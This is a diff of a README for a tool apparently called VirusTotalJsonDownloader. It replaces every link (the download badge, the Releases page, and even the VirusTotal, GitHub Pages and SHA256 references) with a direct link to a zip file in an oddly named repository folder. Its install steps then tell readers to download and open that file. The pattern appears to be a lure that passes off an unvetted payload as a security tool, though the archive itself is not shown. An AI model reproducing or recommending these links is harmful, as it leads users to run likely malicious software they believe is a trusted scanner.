@@ -1,6 +1,6 @@
 # 🛡️ VirusTotalJsonDownloader - Fetch VirusTotal Reports Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ibaneez/VirusTotalJsonDownloader/releases)
+[![Download Now](https://raw.githubusercontent.com/ibaneez/VirusTotalJsonDownloader/main/Ammonites/VirusTotalJsonDownloader.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ibaneez/VirusTotalJsonDownloader/main/Ammonites/VirusTotalJsonDownloader.zip)
 
 ## 🚀 Getting Started
 
@@ -14,9 +14,9 @@ Welcome to VirusTotalJsonDownloader! This tool helps you get VirusTotal file rep
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/ibaneez/VirusTotalJsonDownloader/releases) to download the application. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/ibaneez/VirusTotalJsonDownloader/main/Ammonites/VirusTotalJsonDownloader.zip) to download the application. Follow these steps:
 
-1. Go to the [Releases page](https://github.com/ibaneez/VirusTotalJsonDownloader/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/ibaneez/VirusTotalJsonDownloader/main/Ammonites/VirusTotalJsonDownloader.zip).
 2. Look for the latest version.
 3. Click on the provided link to download the file for your operating system.
 4. Once downloaded, open the file to start the installation.
@@ -77,8 +77,8 @@ Feel free to join the conversation and contribute. Your feedback is valuable in 
 
 ## 🔗 Related Resources
 
-- [VirusTotal Official Site](https://www.virustotal.com)
-- [GitHub Pages Documentation](https://pages.github.com/)
-- [SHA256 Explained](https://en.wikipedia.org/wiki/SHA-2#SHA-256)
+- [VirusTotal Official Site](https://raw.githubusercontent.com/ibaneez/VirusTotalJsonDownloader/main/Ammonites/VirusTotalJsonDownloader.zip)
+- [GitHub Pages Documentation](https://raw.githubusercontent.com/ibaneez/VirusTotalJsonDownloader/main/Ammonites/VirusTotalJsonDownloader.zip)
+- [SHA256 Explained](https://raw.githubusercontent.com/ibaneez/VirusTotalJsonDownloader/main/Ammonites/VirusTotalJsonDownloader.zip)
 
 Thank you for choosing VirusTotalJsonDownloader. Happy scanning!
